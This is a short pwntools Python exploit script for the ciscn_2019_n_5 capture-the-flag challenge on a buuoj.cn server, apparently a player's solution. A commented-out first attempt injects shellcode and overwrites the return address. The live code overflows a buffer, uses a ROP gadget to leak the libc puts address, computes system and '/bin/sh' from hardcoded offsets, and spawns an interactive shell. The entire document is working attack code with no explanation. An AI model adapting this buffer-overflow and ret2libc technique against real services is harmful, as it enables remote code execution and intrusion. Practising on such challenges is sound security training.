# from pwn import *
# context(arch='amd64',os='linux')
# context.log_level='debug'

# shellcode=asm(shellcraft.sh())

# p=remote('node5.buuoj.cn',25571)

# p.recvuntil(b'name\n')
# p.sendline(shellcode)

# p.recvuntil(b'me?\n')

# name_addr=0x601080
# payload=b'a'*(0x28)+p64(name_addr)
# p.sendline(payload)

# p.interactive()

from pwn import*
p=remote('node5.buuoj.cn',25571)
#p=process('./ciscn')
elf=ELF('/home/lixingjian/pwn/ciscn_2019_n_5')
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main=0x400636
pop_rdi=0x400713
ret=0x4004c9
p.recvuntil('name\n')
p.sendline('aaa')
p.recvuntil('me?\n')
payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)
puts_add=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_add))
system=puts_add-0x31580
binsh=puts_add+0x1334da
p.recvuntil('name\n')
p.sendline('aaa')
p.recvuntil('me?\n')
payload=b'a'*0x28+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendline(payload)
p.interactive()